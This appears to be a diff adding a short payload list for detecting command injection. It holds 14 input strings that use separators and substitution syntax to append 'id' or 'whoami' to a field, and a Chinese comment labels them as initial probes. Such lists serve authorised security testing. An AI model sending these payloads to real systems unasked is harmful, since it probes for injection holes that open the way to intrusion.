@@ -1,0 +1,17 @@
+# Command Injection Quick Detection Payloads
+# 快速检测payload - 用于初步探测
+
+; id
+| id
+|| id
+& id
+&& id
+`id`
+$(id)
+; whoami
+| whoami
+|| whoami
+& whoami
+&& whoami
+`whoami`
+$(whoami)
